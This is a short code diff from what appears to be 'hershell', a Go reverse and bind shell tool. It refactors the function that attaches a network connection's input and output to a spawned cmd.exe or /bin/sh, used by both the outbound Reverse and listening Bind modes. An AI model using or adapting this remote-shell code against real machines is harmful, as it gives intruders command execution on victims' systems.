@@ -11,11 +11,11 @@ import (
 	"crypto/x509/pkix"
 	"encoding/hex"
 	"encoding/pem"
+	"hershell/shell"
 	"math/big"
 	"net"
 	"os"
 	"os/exec"
-	"runtime"
 	"strings"
 	"time"
 )
@@ -38,14 +38,8 @@ var (
 	connType      string
 )
 
-func GetShell(conn net.Conn) {
-	var cmd *exec.Cmd
-	switch runtime.GOOS {
-	case "windows":
-		cmd = exec.Command("C:\\Windows\\System32\\cmd.exe")
-	default:
-		cmd = exec.Command("/bin/sh")
-	}
+func RunShell(conn net.Conn) {
+	var cmd *exec.Cmd = shell.GetShell()
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Stdin = conn
@@ -125,7 +119,7 @@ func Reverse(connectString string, fingerprint []byte) {
 	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
 		os.Exit(ERR_BAD_FINGERPRINT)
 	}
-	GetShell(conn)
+	RunShell(conn)
 }
 
 func Bind(addr string) {
@@ -141,7 +135,7 @@ func Bind(addr string) {
 		if err != nil {
 			continue
 		}
-		go GetShell(conn)
+		go RunShell(conn)
 	}
 }
 
